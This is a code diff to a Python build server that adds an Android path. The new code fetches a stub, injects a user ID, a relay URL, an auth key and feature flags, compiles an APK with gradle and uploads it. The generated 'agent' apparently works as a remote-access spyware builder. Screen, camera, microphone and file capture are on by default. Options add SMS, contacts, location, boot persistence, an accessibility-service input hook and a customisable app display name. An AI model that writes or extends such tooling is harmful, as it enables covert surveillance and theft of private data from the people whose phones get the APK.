@@ -100,8 +100,9 @@ def progress(bid, pct, msg="", status="building"):
     except Exception as e:
         warn(f"progress error: {e}")
 
-def fetch_stub(_fun_features=False):
-    r = requests.get(API("stub"), headers=HEADERS, timeout=20)
+def fetch_stub(_fun_features=False, platform="windows"):
+    url = API("stub") + (f"?platform={platform}" if platform != "windows" else "")
+    r = requests.get(url, headers=HEADERS, timeout=20)
     r.raise_for_status()
     return r.json()["files"]
 
@@ -123,8 +124,10 @@ def rust_string(s) -> str:
 
 def build(b):
     bid  = b["id"]
+    platform = b.get("platform", "windows")
+    if platform == "android":
+        return build_android(b)
     name = b.get("name", "agent")
-    # Sanitize name for use as Cargo binary name (alphanumeric, hyphens, underscores only)
     safe_name = "".join(c if c.isalnum() or c in "-_" else "_" for c in name) or "agent"
     info(f"▶ build {bid[:8]}… ({name} → bin:{safe_name}) for user {str(b.get('user_id',''))[:8]}…")
     progress(bid, 5, "fetching stub")
@@ -261,6 +264,128 @@ def build(b):
         up = requests.post(API("upload"),
                            headers={"X-Buildserver-Key": KEY,
                                     "User-Agent": HEADERS["User-Agent"]},
+                           files=files, data=data, timeout=300)
+        if not up.ok:
+            err(f"upload → HTTP {up.status_code}: {up.text[:200]}")
+            progress(bid, 100, f"upload failed: {up.status_code}", status="failed")
+            return
+        dl = (up.json() or {}).get("download_url")
+        progress(bid, 100, "done", status="success")
+        requests.post(API("progress"), headers=HEADERS, timeout=10,
+            json={"build_id": bid, "progress": 100, "status": "success", "download_url": dl})
+        ok(f"✓ {bid[:8]}… ({file_size_kb} KB)  →  {dl}")
+    except Exception as e:
+        err(f"upload exception: {e}")
+        progress(bid, 100, str(e), status="failed")
+
+def build_android(b):
+    bid = b["id"]
+    name = b.get("name", "agent")
+    safe_name = "".join(c if c.isalnum() or c in "-_" else "_" for c in name).lower() or "agent"
+    info(f"▶ android build {bid[:8]}… ({name}) for user {str(b.get('user_id',''))[:8]}…")
+    progress(bid, 5, "fetching android stub")
+
+    stub = fetch_stub(platform="android")
+    info(f"  stub files: {', '.join(stub.keys())}")
+    feats = b.get("features", {}) or {}
+    relay_url = b.get("relay_url", "wss://veltrix.hidenfree.com")
+
+    ctx = {
+        "USER_ID":         b["user_id"],
+        "API_BASE":        b.get("target_server_url", FRONTEND),
+        "RELAY_URL":       relay_url,
+        "HIDEN_AUTH_KEY":  HIDEN_AUTH_KEY,
+        "BUILD_NAME":      safe_name,
+        "BUILD_TAG":       b.get("tag") or "",
+        "SUPABASE_URL":    SUPABASE_URL,
+        "SUPABASE_ANON_KEY": SUPABASE_ANON_KEY,
+        "DEBUG":           "true" if b.get("debug") else "false",
+        "FEATURE_STARTUP": "true" if b.get("startup") else "false",
+        "FEATURE_SCREEN":  "true" if feats.get("screen", True) else "false",
+        "FEATURE_CAMERA":  "true" if feats.get("camera", True) else "false",
+        "FEATURE_FILES":   "true" if feats.get("files", True) else "false",
+        "FEATURE_MIC":     "true" if feats.get("mic", True) else "false",
+        "FEATURE_LOCATION":"true" if feats.get("location") else "false",
+        "FEATURE_SMS":     "true" if feats.get("sms") else "false",
+        "FEATURE_CONTACTS":"true" if feats.get("contacts") else "false",
+        "FEATURE_NOTIFICATIONS": "true" if feats.get("notifications", True) else "false",
+        "FEATURE_INPUT":   "true" if feats.get("input") else "false",
+        "PACKAGE_SUFFIX":  safe_name,
+        "APP_DISPLAY_NAME": feats.get("app_display_name", name),
+        # Manifest conditionals
+        "OPT_BOOT_PERMISSION": '<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />' if b.get("startup") else "",
+        "OPT_BOOT_RECEIVER": '<receiver android:name=".BootReceiver" android:exported="false"><intent-filter><action android:name="android.intent.action.BOOT_COMPLETED" /></intent-filter></receiver>' if b.get("startup") else "",
+        "OPT_LOCATION_PERMISSIONS": '<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />\n    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />' if feats.get("location") else "",
+        "OPT_SMS_PERMISSIONS": '<uses-permission android:name="android.permission.READ_SMS" />\n    <uses-permission android:name="android.permission.RECEIVE_SMS" />' if feats.get("sms") else "",
+        "OPT_CONTACTS_PERMISSIONS": '<uses-permission android:name="android.permission.READ_CONTACTS" />' if feats.get("contacts") else "",
+        "OPT_ACCESSIBILITY_SERVICE": "" if not feats.get("input") else '<service android:name=".InputAccessibilityService" android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE" android:exported="false"><intent-filter><action android:name="android.accessibilityservice.AccessibilityService" /></intent-filter><meta-data android:name="android.accessibilityservice" android:resource="@xml/accessibility_config" /></service>',
+    }
+
+    bdir = WORK / bid; shutil.rmtree(bdir, ignore_errors=True); bdir.mkdir(parents=True)
+    for fname, src in stub.items():
+        fpath = bdir / fname
+        fpath.parent.mkdir(parents=True, exist_ok=True)
+        fpath.write_text(render(src, ctx))
+
+    info(f"  wrote {len(stub)} files to {bdir}")
+    progress(bid, 15, "gradle build starting")
+
+    # Check for Android SDK
+    android_home = os.environ.get("ANDROID_HOME") or os.environ.get("ANDROID_SDK_ROOT")
+    if not android_home:
+        err("ANDROID_HOME not set — cannot build Android APK")
+        progress(bid, 100, "ANDROID_HOME not set on build server", status="failed")
+        return
+
+    gradle = bdir / "gradlew"
+    if not gradle.exists():
+        # Use system gradle
+        gradle_cmd = shutil.which("gradle") or "gradle"
+    else:
+        os.chmod(str(gradle), 0o755)
+        gradle_cmd = str(gradle)
+
+    cmd = [gradle_cmd, "assembleRelease", f"-p{bdir}"]
+    info(f"  $ {' '.join(cmd)}")
+    progress(bid, 20, "compiling APK (this may take a few minutes)")
+
+    proc = subprocess.Popen(cmd, cwd=bdir, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
+    output_lines = []
+    for line in proc.stdout:
+        output_lines.append(line.rstrip())
+        if "BUILD SUCCESSFUL" in line: info(f"  {line.strip()}")
+        elif "FAILURE" in line or line.strip().startswith("error"): err(f"  {line.strip()}")
+    proc.wait()
+
+    if proc.returncode != 0:
+        msg = "\n".join(output_lines[-50:])
+        err(f"android build failed (exit {proc.returncode})")
+        progress(bid, 100, msg[-2000:], status="failed")
+        return
+
+    # Find APK
+    apk = None
+    for root, dirs, files in os.walk(bdir):
+        for f in files:
+            if f.endswith(".apk") and "release" in f.lower():
+                apk = Path(root) / f
+                break
+        if apk: break
+
+    if not apk or not apk.exists():
+        err("APK not found after build")
+        progress(bid, 100, "APK not found", status="failed")
+        return
+
+    file_size_kb = apk.stat().st_size // 1024
+    info(f"  APK: {apk.name} ({file_size_kb} KB)")
+    progress(bid, 85, f"uploading ({file_size_kb} KB)")
+
+    try:
+        files = {"file": (f"{safe_name}.apk", apk.read_bytes(), "application/vnd.android.package-archive")}
+        data = {"build_id": bid}
+        up = requests.post(API("upload"),
+                           headers={"X-Buildserver-Key": KEY, "User-Agent": HEADERS["User-Agent"]},
                            files=files, data=data, timeout=300)
         if not up.ok:
             err(f"upload → HTTP {up.status_code}: {up.text[:200]}")
